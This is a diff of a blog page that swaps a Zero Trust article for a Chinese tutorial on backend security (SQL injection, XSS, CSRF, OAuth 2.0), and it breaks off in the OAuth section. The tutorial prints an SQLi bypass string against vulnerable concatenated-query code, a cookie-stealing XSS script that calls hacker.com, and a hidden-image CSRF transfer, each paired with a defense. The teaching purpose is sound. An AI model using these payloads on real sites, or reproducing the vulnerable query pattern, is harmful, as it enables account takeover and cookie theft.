@@ -19,27 +19,27 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"nivek-yang.github.io","root":"/my-blog/","images":"/my-blog/images","scheme":"Muse","darkmode":false,"version":"8.23.2","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"atom-one-light","dark":"atom-one-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜尋...","empty":"我們無法找到任何有關 ${query} 的搜索結果","hits_time":"找到 ${hits} 個搜索結果（用時 ${time} 毫秒）","hits":"找到 ${hits} 個搜索結果"}}</script><script src="/my-blog/js/config.js" defer></script>
 
-    <meta name="description" content="讓我們來談談一個經典的安全模型：城堡與護城河 (Castle-and-Moat)。數十年來，企業網路安全幾乎都建立在這個模型之上。我們耗費巨資建造了堅固的「城牆」（防火牆）、挖掘了深邃的「護城河」（入侵檢測系統），並在唯一的「吊橋」（VPN）上設置了森嚴的守衛。 這個模型的假設很簡單：牆外是危險的，牆內是安全的。 只要能通過驗證進入內部網路，就會被視為「受信任的」員工，可以在城堡內部相對自由地活動">
+    <meta name="description" content="作為後端工程師，每天都在打造功能、優化效能、建立穩固的系統。然而，在程式碼的字裡行間，一個微小的疏忽就可能成為駭客入侵的後門。安全性不是資安專家的專利，而是每一位後端工程師刻在骨子裡的責任。 這篇文章不只是一份安全清單，更是一場攻防演練，將從最經典的漏洞開始，逐步探討現代化的授權機制，幫助建立起一套完整的後端安全思維。   攻防戰一：資料庫的致命缺口 — SQL Injection SQL Inj">
 <meta property="og:type" content="article">
-<meta property="og:title" content="深入理解新一代安全架構「零信任 (Zero Trust)」">
-<meta property="og:url" content="https://nivek-yang.github.io/2025/10/07/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E6%96%B0%E4%B8%80%E4%BB%A3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%A7%8B%20%E9%9B%B6%E4%BF%A1%E4%BB%BB%20Zero%20Trust/index.html">
+<meta property="og:title" content="從 SQL Injection 到 OAuth 2.0，必備的資安攻防知識">
+<meta property="og:url" content="https://nivek-yang.github.io/2025/10/29/%E5%BE%9E%20SQL%20Injection%20%E5%88%B0%20OAuth%202.0%20%E5%BF%85%E5%82%99%E7%9A%84%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E7%9F%A5%E8%AD%98/index.html">
 <meta property="og:site_name" content="我的技術部落格">
-<meta property="og:description" content="讓我們來談談一個經典的安全模型：城堡與護城河 (Castle-and-Moat)。數十年來，企業網路安全幾乎都建立在這個模型之上。我們耗費巨資建造了堅固的「城牆」（防火牆）、挖掘了深邃的「護城河」（入侵檢測系統），並在唯一的「吊橋」（VPN）上設置了森嚴的守衛。 這個模型的假設很簡單：牆外是危險的，牆內是安全的。 只要能通過驗證進入內部網路，就會被視為「受信任的」員工，可以在城堡內部相對自由地活動">
+<meta property="og:description" content="作為後端工程師，每天都在打造功能、優化效能、建立穩固的系統。然而，在程式碼的字裡行間，一個微小的疏忽就可能成為駭客入侵的後門。安全性不是資安專家的專利，而是每一位後端工程師刻在骨子裡的責任。 這篇文章不只是一份安全清單，更是一場攻防演練，將從最經典的漏洞開始，逐步探討現代化的授權機制，幫助建立起一套完整的後端安全思維。   攻防戰一：資料庫的致命缺口 — SQL Injection SQL Inj">
 <meta property="og:locale" content="zh_TW">
-<meta property="article:published_time" content="2025-10-06T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-10-07T15:17:02.274Z">
+<meta property="article:published_time" content="2025-10-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-10-29T15:03:48.144Z">
 <meta property="article:author" content="Kaiwii">
 <meta property="article:tag" content="Cybersecurity">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="https://nivek-yang.github.io/2025/10/07/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E6%96%B0%E4%B8%80%E4%BB%A3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%A7%8B%20%E9%9B%B6%E4%BF%A1%E4%BB%BB%20Zero%20Trust/">
+<link rel="canonical" href="https://nivek-yang.github.io/2025/10/29/%E5%BE%9E%20SQL%20Injection%20%E5%88%B0%20OAuth%202.0%20%E5%BF%85%E5%82%99%E7%9A%84%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E7%9F%A5%E8%AD%98/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-TW","comments":true,"permalink":"https://nivek-yang.github.io/2025/10/07/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E6%96%B0%E4%B8%80%E4%BB%A3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%A7%8B%20%E9%9B%B6%E4%BF%A1%E4%BB%BB%20Zero%20Trust/","path":"2025/10/07/深入理解新一代安全架構 零信任 Zero Trust/","title":"深入理解新一代安全架構「零信任 (Zero Trust)」"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-TW","comments":true,"permalink":"https://nivek-yang.github.io/2025/10/29/%E5%BE%9E%20SQL%20Injection%20%E5%88%B0%20OAuth%202.0%20%E5%BF%85%E5%82%99%E7%9A%84%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E7%9F%A5%E8%AD%98/","path":"2025/10/29/從 SQL Injection 到 OAuth 2.0 必備的資安攻防知識/","title":"從 SQL Injection 到 OAuth 2.0，必備的資安攻防知識"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>深入理解新一代安全架構「零信任 (Zero Trust)」 | 我的技術部落格</title>
+<title>從 SQL Injection 到 OAuth 2.0，必備的資安攻防知識 | 我的技術部落格</title>
   
 
 
@@ -531,7 +531,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E9%BA%BC%E6%98%AF-zero-trust"><span class="nav-number">1.</span> <span class="nav-text"> 什麼是 Zero Trust？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%82%BA%E4%BB%80%E9%BA%BC%E9%9C%80%E8%A6%81-zero-trust"><span class="nav-number">2.</span> <span class="nav-text"> 為什麼需要 Zero Trust？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#zero-trust-%E7%9A%84%E4%B8%89%E5%A4%A7%E5%8E%9F%E5%89%87"><span class="nav-number">3.</span> <span class="nav-text"> Zero Trust 的三大原則</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#zero-trust-%E6%9E%B6%E6%A7%8B%E7%9A%84%E9%97%9C%E9%8D%B5%E5%85%83%E7%B4%A0"><span class="nav-number">4.</span> <span class="nav-text"> Zero Trust 架構的關鍵元素</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%B0%A1%E5%96%AE%E4%BE%8B%E5%AD%90"><span class="nav-number">5.</span> <span class="nav-text"> 簡單例子</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%82%B3%E7%B5%B1%E6%A8%A1%E5%BC%8F"><span class="nav-number">5.1.</span> <span class="nav-text"> 傳統模式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#zero-trust-%E6%A8%A1%E5%BC%8F"><span class="nav-number">5.2.</span> <span class="nav-text"> Zero Trust 模式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A6%8B-zero-trust-%E6%8A%80%E8%A1%93"><span class="nav-number">6.</span> <span class="nav-text"> 常見 Zero Trust 技術</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9B%B6%E4%BF%A1%E4%BB%BB%E4%B8%8D%E6%98%AF%E4%B8%80%E8%B9%B4%E5%8F%AF%E5%B9%BE%E8%80%8C%E6%98%AF%E4%B8%80%E8%B6%9F%E6%97%85%E7%A8%8B"><span class="nav-number">7.</span> <span class="nav-text"> 零信任不是一蹴可幾，而是一趟旅程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%B8%BD%E7%B5%90"><span class="nav-number">8.</span> <span class="nav-text"> 總結</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E6%88%B0%E4%B8%80%E8%B3%87%E6%96%99%E5%BA%AB%E7%9A%84%E8%87%B4%E5%91%BD%E7%BC%BA%E5%8F%A3-sql-injection"><span class="nav-number">1.</span> <span class="nav-text"> 攻防戰一：資料庫的致命缺口 — SQL Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%94%BB%E6%93%8A%E5%A0%B4%E6%99%AF-the-attack"><span class="nav-number">1.1.</span> <span class="nav-text"> 攻擊場景 (The Attack)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E7%A6%A6%E7%AD%96%E7%95%A5-the-defense"><span class="nav-number">1.2.</span> <span class="nav-text"> 防禦策略 (The Defense)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E9%98%B2%E6%88%B0%E4%BA%8C%E5%89%8D%E7%AB%AF%E7%9A%84%E4%BF%A1%E4%BB%BB%E5%8D%B1%E6%A9%9F-xss-csrf"><span class="nav-number">2.</span> <span class="nav-text"> 攻防戰二：前端的信任危機 — XSS &amp; CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-%E8%B7%A8%E7%B6%B2%E7%AB%99%E6%8C%87%E4%BB%A4%E7%A2%BC-cross-site-scripting-xss"><span class="nav-number">2.1.</span> <span class="nav-text"> 1. 跨網站指令碼 (Cross-Site Scripting, XSS)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-%E8%B7%A8%E7%AB%99%E8%AB%8B%E6%B1%82%E5%81%BD%E9%80%A0-cross-site-request-forgery-csrf"><span class="nav-number">2.2.</span> <span class="nav-text"> 2. 跨站請求偽造 (Cross-Site Request Forgery, CSRF)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8F%BE%E4%BB%A3%E5%8C%96%E7%9A%84%E6%8E%88%E6%AC%8A%E6%A1%86%E6%9E%B6oauth-20"><span class="nav-number">3.</span> <span class="nav-text"> 現代化的授權框架：OAuth 2.0</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#oauth-20-%E7%9A%84%E6%A0%B8%E5%BF%83%E8%A7%92%E8%89%B2"><span class="nav-number">3.1.</span> <span class="nav-text"> OAuth 2.0 的核心角色</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B0%A1%E5%8C%96%E7%9A%84%E6%8E%88%E6%AC%8A%E7%A2%BC%E6%A8%A1%E5%BC%8F%E6%B5%81%E7%A8%8B-authorization-code-grant"><span class="nav-number">3.2.</span> <span class="nav-text"> 簡化的授權碼模式流程 (Authorization Code Grant)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%B5%90%E8%AB%96"><span class="nav-number">4.</span> <span class="nav-text"> 結論</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -579,7 +579,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-TW">
-    <link itemprop="mainEntityOfPage" href="https://nivek-yang.github.io/2025/10/07/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E6%96%B0%E4%B8%80%E4%BB%A3%E5%AE%89%E5%85%A8%E6%9E%B6%E6%A7%8B%20%E9%9B%B6%E4%BF%A1%E4%BB%BB%20Zero%20Trust/">
+    <link itemprop="mainEntityOfPage" href="https://nivek-yang.github.io/2025/10/29/%E5%BE%9E%20SQL%20Injection%20%E5%88%B0%20OAuth%202.0%20%E5%BF%85%E5%82%99%E7%9A%84%E8%B3%87%E5%AE%89%E6%94%BB%E9%98%B2%E7%9F%A5%E8%AD%98/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/my-blog/images/avatar.gif">
@@ -592,12 +592,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="深入理解新一代安全架構「零信任 (Zero Trust)」 | 我的技術部落格">
+      <meta itemprop="name" content="從 SQL Injection 到 OAuth 2.0，必備的資安攻防知識 | 我的技術部落格">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          深入理解新一代安全架構「零信任 (Zero Trust)」
+          從 SQL Injection 到 OAuth 2.0，必備的資安攻防知識
         </h1>
 
         <div class="post-meta-container">
@@ -609,7 +609,7 @@
       <span class="post-meta-item-text">發表於</span>
       
 
-      <time title="創建時間：2025-10-07 00:00:00 / 修改時間：23:17:02" itemprop="dateCreated datePublished" datetime="2025-10-07T00:00:00+08:00">2025-10-07</time>
+      <time title="創建時間：2025-10-29 00:00:00 / 修改時間：23:03:48" itemprop="dateCreated datePublished" datetime="2025-10-29T00:00:00+08:00">2025-10-29</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -630,134 +630,131 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><p>讓我們來談談一個經典的安全模型：<strong>城堡與護城河 (Castle-and-Moat)</strong>。數十年來，企業網路安全幾乎都建立在這個模型之上。我們耗費巨資建造了堅固的「城牆」（防火牆）、挖掘了深邃的「護城河」（入侵檢測系統），並在唯一的「吊橋」（VPN）上設置了森嚴的守衛。</p>
-<p>這個模型的假設很簡單：<strong>牆外是危險的，牆內是安全的。</strong> 只要能通過驗證進入內部網路，就會被視為「受信任的」員工，可以在城堡內部相對自由地活動。</p>
-<p>然而，在雲端服務、遠距辦公和行動裝置已成主流的今天，這座城堡的邊界早已模糊不清。當員工在咖啡廳用著個人筆電存取雲端 SaaS 服務時，「牆內」和「牆外」的區別在哪裡？更致命的是，一旦攻擊者（或內部威脅）通過釣魚郵件等方式騙取了 VPN 憑證，就等於直接越過了護城河，整個城堡的內部將暢行無阻。</p>
-<p>這個過時的信任模型，正是「零信任 (Zero Trust)」架構要徹底顛覆的對象。</p>
+    <div class="post-body" itemprop="articleBody"><p>作為後端工程師，每天都在打造功能、優化效能、建立穩固的系統。然而，在程式碼的字裡行間，一個微小的疏忽就可能成為駭客入侵的後門。安全性不是資安專家的專利，而是每一位後端工程師刻在骨子裡的責任。</p>
+<p>這篇文章不只是一份安全清單，更是一場攻防演練，將從最經典的漏洞開始，逐步探討現代化的授權機制，幫助建立起一套完整的後端安全思維。</p>
 <hr />
-<h1 id="什麼是-zero-trust"><a class="markdownIt-Anchor" href="#什麼是-zero-trust"></a> 什麼是 Zero Trust？</h1>
-<p><strong>Zero Trust（零信任）</strong> 是一種 <strong>網路安全架構理念</strong>，核心思想是：<br />
-👉 <strong>不要預設信任任何人或任何設備，不論它們在網路內部還是外部，每次存取資源都必須驗證。</strong></p>
-<p>Zero Trust 不是一個產品，也不是一套工具，而是一種<strong>安全策略和思維框架</strong>。它由前 Forrester 分析師 John Kindervag 在 2010 年提出，其核心理念極其簡單，卻又極具顛覆性：</p>
+<h1 id="攻防戰一資料庫的致命缺口-sql-injection"><a class="markdownIt-Anchor" href="#攻防戰一資料庫的致命缺口-sql-injection"></a> 攻防戰一：資料庫的致命缺口 — SQL Injection</h1>
+<p>SQL Injection（SQLi）堪稱是 Web 安全史上最古老、也最具破壞力的漏洞之一。它能讓攻擊者繞過應用邏輯，直接對資料庫下達指令。</p>
+<h2 id="攻擊場景-the-attack"><a class="markdownIt-Anchor" href="#攻擊場景-the-attack"></a> 攻擊場景 (The Attack)</h2>
+<p>想像一下，有一個簡單的登入功能，後端程式碼是這樣寫的 (以 Node.js 為例)：</p>
+<pre class="highlight"><code class="javascript"><span class="hljs-comment">// !!! 這是一段極度危險的程式碼 !!!</span>
+<span class="hljs-keyword">const</span> userInputUsername = ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;
+<span class="hljs-keyword">const</span> sql = <span class="hljs-string">`SELECT * FROM users WHERE username = &#x27;<span class="hljs-subst">$&#123;userInputUsername&#125;</span>&#x27;`</span>;
+<span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">query</span>(sql);
+</code></pre>
+<p>使用者正常輸入時，一切安好。但如果攻擊者在輸入框裡填入：</p>
+<pre class="highlight"><code class="">' OR '1'='1' --
+</code></pre>
+<p>後端拼接出的 SQL 語句就會變成：</p>
+<pre class="highlight"><code class="sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-comment">--&#x27;</span>
+</code></pre>
+<ul>
+<li><code>' OR '1'='1'</code> 永遠為真，<code>WHERE</code> 條件被直接繞過。</li>
+<li><code>--</code> 是 SQL 的註解符號，它會讓後續的語法 (例如密碼檢查) 全部失效。</li>
+</ul>
+<p><strong>結果</strong>：攻擊者無需密碼，就能登入系統中的第一個帳號（通常是管理員），甚至可以進一步執行 <code>DROP TABLE</code> 等毀滅性操作。</p>
+<h2 id="防禦策略-the-defense"><a class="markdownIt-Anchor" href="#防禦策略-the-defense"></a> 防禦策略 (The Defense)</h2>
+<p>防禦 SQLi 的核心原則是：<strong>永遠不要信任使用者的輸入，並將「程式碼」與「資料」徹底分離。</strong></p>
+<p><strong>解法：參數化查詢 (Parameterized Queries / Prepared Statements)</strong></p>
+<p>所有主流的資料庫驅動程式都支援參數化查詢。讓我們重寫上面的程式碼：</p>
+<pre class="highlight"><code class="javascript"><span class="hljs-comment">// ✅ 安全的寫法</span>
+<span class="hljs-keyword">const</span> userInputUsername = ctx.<span class="hljs-property">request</span>.<span class="hljs-property">body</span>.<span class="hljs-property">username</span>;
+<span class="hljs-keyword">const</span> sql = <span class="hljs-string">`SELECT * FROM users WHERE username = ?`</span>;
+<span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> db.<span class="hljs-title function_">query</span>(sql, [userInputUsername]);
+</code></pre>
+<p><strong>為什麼這樣就安全了？</strong></p>
+<ul>
+<li>資料庫會先編譯 <code>SELECT * FROM users WHERE username = ?</code> 這個 SQL <strong>結構</strong>。</li>
+<li>然後，<code>userInputUsername</code> 的值會作為一個<strong>純粹的字串資料</strong>被傳入 <code>?</code> 的位置。</li>
+<li>即使攻擊者輸入 <code>' OR '1'='1' --</code>，它也只會被當成一個完整的、荒謬的用戶名去查詢，而不會被當成 SQL 語法執行。</li>
+</ul>
 <blockquote>
-<p><strong>Never Trust, Always Verify. (永不信任，一律驗證)</strong></p>
+<p><strong>防禦心法</strong>：停止手動拼接 SQL 字串。將所有使用者輸入都視為潛在的惡意資料，並透過參數化查詢的機制交由資料庫驅動來處理。</p>
 </blockquote>
-<p>這意味著，我們必須拋棄傳統安全模型「公司內網可信，外網不可信」的二元假設。在零信任模型中，<strong>預設沒有任何使用者、裝置或網路流量是可信的——無論它來自內部網路還是外部網路。</strong> 每一次的存取請求，都必須像來自一個不受信任的網路一樣，經過嚴格的身份驗證、授權和加密，才能被放行。</p>
-<p><strong>簡單比喻：</strong></p>
+<hr />
+<h1 id="攻防戰二前端的信任危機-xss-csrf"><a class="markdownIt-Anchor" href="#攻防戰二前端的信任危機-xss-csrf"></a> 攻防戰二：前端的信任危機 — XSS &amp; CSRF</h1>
+<p>當後端服務需要渲染 HTML 或處理來自瀏覽器的請求時，戰場就從伺服器轉移到了使用者的瀏覽器。</p>
+<h2 id="1-跨網站指令碼-cross-site-scripting-xss"><a class="markdownIt-Anchor" href="#1-跨網站指令碼-cross-site-scripting-xss"></a> 1. 跨網站指令碼 (Cross-Site Scripting, XSS)</h2>
 <ul>
-<li><strong>傳統模型：</strong> 像一個鄉村俱樂部。只要是會員（通過了 VPN 認證），進門後就可以自由使用所有設施。</li>
-<li><strong>零信任模型：</strong> 像一棟高度機密的政府大樓。刷卡進入大門後，要去 A 房間需要再次刷卡驗證；要去 B 檔案室，不僅要刷卡，可能還需要指紋和虹膜掃描。<strong>每一次穿越一道門，都需要重新證明身份和權限。</strong></li>
+<li><strong>攻擊原理</strong>：攻擊者將惡意 JavaScript 腳本注入到網站頁面中，當其他使用者瀏覽該頁面時，這段腳本就會在他們的瀏覽器上執行。</li>
+<li><strong>攻擊場景</strong>：在一個部落格的留言區，攻擊者提交了一條留言：<code>&lt;script&gt;document.location='http://hacker.com/steal?cookie='+document.cookie&lt;/script&gt;</code>。如果後端沒有處理，直接將這段內容存入資料庫，並在頁面上渲染出來，那麼每個看到這條留言的使用者的 Cookie 都會被發送到攻擊者的伺服器。</li>
+<li><strong>防禦策略</strong>：
+<ul>
+<li><strong>輸出編碼 (Output Encoding)</strong>：在將使用者內容渲染到 HTML 前，對特殊字元進行編碼。例如，<code>&lt;</code> 變成 <code>&amp;lt;</code>，<code>&gt;</code> 變成 <code>&amp;gt;</code>。幾乎所有的現代前端框架（React, Vue）和後端樣板引擎（EJS, Jinja2）都預設開啟此功能。</li>
+<li><strong>內容安全策略 (Content Security Policy, CSP)</strong>：透過 HTTP Header 告訴瀏覽器，只允許載入和執行來自你指定來源的腳本，有效降低 XSS 的風險。</li>
 </ul>
-<p>在 Zero Trust 模型下：</p>
+</li>
+</ul>
+<h2 id="2-跨站請求偽造-cross-site-request-forgery-csrf"><a class="markdownIt-Anchor" href="#2-跨站請求偽造-cross-site-request-forgery-csrf"></a> 2. 跨站請求偽造 (Cross-Site Request Forgery, CSRF)</h2>
 <ul>
-<li>沒有「安全區域」的概念。</li>
-<li>所有存取都需要 <strong>驗證 (Verify)</strong> 與 <strong>授權 (Authorize)</strong>。</li>
+<li><strong>攻擊原理</strong>：誘騙已登入的使用者，在他們不知情的情況下，點擊一個惡意連結或載入一個惡意頁面，從而以他們的身份向你的網站發送一個他們不希望的請求（例如：轉帳、刪除文章）。</li>
+<li><strong>攻擊場景</strong>：小明登入了網路銀行。接著，他收到一封 email，點開了一個有趣的貓咪圖片網站。該網站的頁面中隱藏了這樣的程式碼：<code>&lt;img src=&quot;https://bank.com/transfer?to=hacker&amp;amount=10000&quot; style=&quot;display:none;&quot;&gt;</code>。瀏覽器會自動帶上小明在 <code>bank.com</code> 的 Cookie，向銀行發起轉帳請求，而銀行會認為這是小明本人的操作。</li>
+<li><strong>防禦策略</strong>：
+<ul>
+<li><strong>Anti-CSRF Token</strong>：使用者訪問表單頁面時，伺服器生成一個隨機的、不可預測的 Token，並將其嵌入表單。當使用者提交表單時，伺服器會驗證這個 Token 是否匹配。攻擊者無法得知這個隨機 Token，因此無法偽造請求。</li>
+<li><strong>SameSite Cookie 屬性</strong>：將 Cookie 設置為 <code>SameSite=Lax</code> 或 <code>Strict</code>，可以指示瀏覽器不要在跨站請求中發送該 Cookie，從根本上阻止 CSRF 攻擊。</li>
+</ul>
+</li>
 </ul>
 <hr />
-<h1 id="為什麼需要-zero-trust"><a class="markdownIt-Anchor" href="#為什麼需要-zero-trust"></a> 為什麼需要 Zero Trust？</h1>
-<p>傳統的安全模式（perimeter-based, 邊界防禦）存在問題：</p>
-<ol>
-<li><strong>VPN/內網突破</strong>：一旦駭客進入內網，就能存取大量資源。</li>
-<li><strong>雲端與遠端工作普及</strong>：使用者可能來自不同地點與裝置。</li>
-<li><strong>內部威脅</strong>：員工或受感染的設備也可能帶來風險。</li>
-</ol>
-<p>Zero Trust 用來降低這些風險。</p>
-<hr />
-<h1 id="zero-trust-的三大原則"><a class="markdownIt-Anchor" href="#zero-trust-的三大原則"></a> Zero Trust 的三大原則</h1>
-<ol>
-<li>
-<p><strong>Verify Explicitly（明確驗證）</strong></p>
+<h1 id="現代化的授權框架oauth-20"><a class="markdownIt-Anchor" href="#現代化的授權框架oauth-20"></a> 現代化的授權框架：OAuth 2.0</h1>
+<p>隨著微服務和第三方應用生態的興起，面臨一個新的問題：<strong>如何在不洩漏使用者密碼的前提下，安全地授權一個應用（Client）去訪問另一個應用（Resource Server）上的使用者資料？</strong></p>
+<p>這就是 OAuth 2.0 要解決的核心問題。它是一個<strong>授權 (Authorization)</strong> 框架，而不是<strong>認證 (Authentication)</strong> 協議。</p>
 <blockquote>
-<p>每次存取都要驗證身分（MFA、多因素驗證）、裝置狀態、地理位置等。</p>
+<p><strong>記住這點</strong>：Authentication 是確認「你是誰」，Authorization 是確認「你能做什麼」。</p>
 </blockquote>
-<p>這是「一律驗證」的具體化。每一次的存取請求，都必須基於所有可用的數據點進行全面的驗證，包括：</p>
-<ul>
-<li><strong>使用者身份：</strong> 是誰在請求？（強身份認證，如 MFA 多因子認證）</li>
-<li><strong>裝置健康狀況：</strong> 請求來自哪個裝置？這個裝置是否合規、有沒有中毒？</li>
-<li><strong>存取位置：</strong> 請求的地理位置是否正常？</li>
-<li><strong>服務或工作負載：</strong> 他們正在嘗試存取什麼？</li>
-<li><strong>數據分類：</strong> 正在被存取的數據是否敏感？</li>
-</ul>
-<p>只有綜合評估這些信號後，系統才會做出信任判斷。</p>
-</li>
-<li>
-<p><strong>Least Privilege Access（最小權限存取）</strong></p>
-<blockquote>
-<p>使用者或服務只擁有完成任務所需的最小權限，避免過度授權。</p>
-</blockquote>
-<p>這是「永不信任」的體現。一旦使用者通過驗證，也絕不給予他們完全的信任。他們只應被授予完成其特定任務所需的<strong>最小權限</strong>。</p>
-<ul>
-<li><strong>Just-in-Time (JIT) Access:</strong> 只在需要時才授予臨時權限，任務完成後立刻收回。</li>
-<li><strong>Just-Enough-Access (JEA):</strong> 權限範圍嚴格限制在必需的數據和資源上。</li>
-<li><strong>目標：</strong> 大幅縮小潛在的攻擊面。即使某個帳號被盜，攻擊者能造成的破壞也被限制在一個極小的範圍內。</li>
-</ul>
-</li>
-<li>
-<p><strong>Assume Breach（假設已被入侵）</strong></p>
-<blockquote>
-<p>系統假設隨時可能被突破，並持續監控與分段隔離。</p>
-</blockquote>
-<p>這是一種防禦性的思維轉變。必須假設，攻擊者<strong>已經</strong>存在於我們的網路之內。基於這個假設，所做的一切設計都是為了：</p>
-<ul>
-<li><strong>將爆炸半徑最小化：</strong> 通過<strong>微分段 (Micro-segmentation)</strong> 技術，將網路切分成許多微小的、相互隔離的區域。這樣，即使一個區域被攻破，攻擊者也無法輕易地橫向移動到其他區域。</li>
-<li><strong>端到端加密：</strong> 確保所有網路流量，即使是內部流量，都經過加密。</li>
-<li><strong>持續監控與分析：</strong> 利用分析工具持續監測網路活動，以便盡快偵測到威脅並做出反應。</li>
-</ul>
-</li>
-</ol>
-<hr />
-<h1 id="zero-trust-架構的關鍵元素"><a class="markdownIt-Anchor" href="#zero-trust-架構的關鍵元素"></a> Zero Trust 架構的關鍵元素</h1>
-<ul>
-<li><strong>身分驗證 (Identity Verification)</strong> → SSO、MFA</li>
-<li><strong>裝置安全 (Device Security)</strong> → 僅允許合規裝置存取</li>
-<li><strong>網路微分段 (Micro-segmentation)</strong> → 不同應用、服務之間要分隔</li>
-<li><strong>持續監控 (Continuous Monitoring)</strong> → 偵測異常行為</li>
-<li><strong>動態授權 (Adaptive Access Control)</strong> → 根據情境決定是否允許</li>
-</ul>
-<hr />
-<h1 id="簡單例子"><a class="markdownIt-Anchor" href="#簡單例子"></a> 簡單例子</h1>
-<h2 id="傳統模式"><a class="markdownIt-Anchor" href="#傳統模式"></a> 傳統模式</h2>
-<ul>
-<li>員工進入內網後，就能存取所有內部資源。</li>
-<li>駭客只要破解 VPN 或某台內部機器，就能橫向移動，拿到更多資料。</li>
-</ul>
-<h2 id="zero-trust-模式"><a class="markdownIt-Anchor" href="#zero-trust-模式"></a> Zero Trust 模式</h2>
-<ul>
-<li>
-<p>員工登入公司雲端系統時，必須：</p>
+<h2 id="oauth-20-的核心角色"><a class="markdownIt-Anchor" href="#oauth-20-的核心角色"></a> OAuth 2.0 的核心角色</h2>
 <ol>
-<li>使用 MFA 驗證身份</li>
-<li>驗證裝置是否安全（例如防毒軟體是否開啟）</li>
-<li>僅授權該員工所需的應用（例如只能開 HR 系統，不能開財務系統）</li>
+<li><strong>資源擁有者 (Resource Owner)</strong>：你，也就是使用者。</li>
+<li><strong>用戶端 (Client)</strong>：第三方應用，例如一個想讀取你 Google 相簿的相片沖印服務。</li>
+<li><strong>授權伺服器 (Authorization Server)</strong>：負責驗證使用者身份、獲取使用者同意，並發放「令牌」的服務，例如 <code>accounts.google.com</code>。</li>
+<li><strong>資源伺服器 (Resource Server)</strong>：儲存使用者資料的服務，例如 Google 相簿的 API。</li>
 </ol>
-</li>
-<li>
-<p>若異常行為（如短時間內嘗試大量下載檔案），會被即時阻擋。</p>
-</li>
-</ul>
-<hr />
-<h1 id="常見-zero-trust-技術"><a class="markdownIt-Anchor" href="#常見-zero-trust-技術"></a> 常見 Zero Trust 技術</h1>
-<ul>
